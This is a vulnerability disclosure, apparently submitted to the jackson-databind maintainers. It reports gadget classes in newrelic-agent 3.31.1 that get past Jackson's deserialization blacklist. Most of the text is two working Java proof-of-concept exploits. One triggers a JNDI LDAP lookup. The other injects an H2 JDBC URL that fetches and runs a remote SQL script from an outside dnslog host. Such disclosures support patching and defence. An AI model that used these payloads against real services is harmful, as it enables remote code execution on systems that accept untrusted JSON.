Report by: Al1ex@knownsec
Received: 2020-12-22
Contact author: hps_fly@163.com or https://github.com/Al1ex/
Evaluation:

  - Library itself not notable, see
  
  https://mvnrepository.com/artifact/com.newrelic.agent.java/newrelic-agent

  with only 6 deps. But one of its dependencies:
  
  https://mvnrepository.com/artifact/com.taoensso/timbre  

  is a Clojure library depended on by 752 artifacts so it does qualify, depending
  on version 3.31.1 which does have classes described.
  
---------------------------------------------------------------------------

Vulnerability description

com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource 
com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManagerConnectionSource

Class bypasses the
blacklist class previously maintained by Jackson databind, and rce can be caused if the JDK
version is lower.

Vulnerability proof

Pom.xml:

<dependencies>
	<!-- https://mvnrepository.com/artifact/com.newrelic.agent.java/newrelic-agent -->
	<dependency>
		<groupId>com.newrelic.agent.java</groupId>
		<artifactId>newrelic-agent</artifactId>
		<version>3.31.1</version>
	</dependency>
</dependencies>


public class POC {
	public static void main(String[] args) throws Exception {
		ObjectMapper mapper = new ObjectMapper();
		mapper.enableDefaultTyping();
		mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false);
		String json = "[\"com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource\",
		{\"jndiLocation\":\"ldap://127.0.0.1:1288/Exploit\"}]";
		Object obj = mapper.readValue(json, Object.class);
		mapper.writeValueAsString(obj);
	}
}

public class POC {
	public static void main(String[] args) throws Exception {
		ObjectMapper mapper = new ObjectMapper();
		mapper.enableDefaultTyping();
		mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false);
		String json =
		"[\"com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManagerConnectionSource\",
		{\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM
		&#39;http://6vrdsp.dnslog.cn/exec.sql&#39;\"}]";
		Object obj = mapper.readValue(json, Object.class);
		mapper.writeValueAsString(obj);
	}
}
